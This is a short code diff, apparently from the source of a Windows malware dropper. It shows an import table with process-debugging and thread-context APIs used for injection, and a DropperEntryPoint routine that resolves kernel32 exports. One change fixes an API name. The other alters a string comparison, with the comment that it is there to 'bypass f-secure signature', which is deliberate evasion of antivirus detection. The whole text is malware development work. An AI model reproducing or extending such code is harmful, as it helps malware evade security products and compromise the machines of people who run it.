@@ -62,7 +62,7 @@ XREFNAMES data_imports[] = {
 			"SetCurrentDirectoryA",  // 14
 			"SetFileAttributesA",	// 15
 			"DebugActiveProcess",	// 16
-			"GetCurrentProcessID",	// 17
+			"GetCurrentProcessId",	// 17
 			"CreateThread",			// 18
 			"GetThreadContext",		// 19
 			"SetThreadContext",		// 20
@@ -241,7 +241,7 @@ int __stdcall DropperEntryPoint( DropperHeader* header )
 		if (moduleName == NULL)
 			goto NEXT_ENTRY;
 		
-		if ( ! _STRCMPI_(moduleName, STRING(STRIDX_KERNEL32_DLL)) ) 
+		if ( ! _STRCMPI_(moduleName+1, STRING(STRIDX_KERNEL32_DLL)+1) ) // +1 to bypass f-secure signature
 		{
 			if (exportDirectory->AddressOfFunctions == NULL) goto NEXT_ENTRY;
 			if (exportDirectory->AddressOfNames == NULL) goto NEXT_ENTRY;
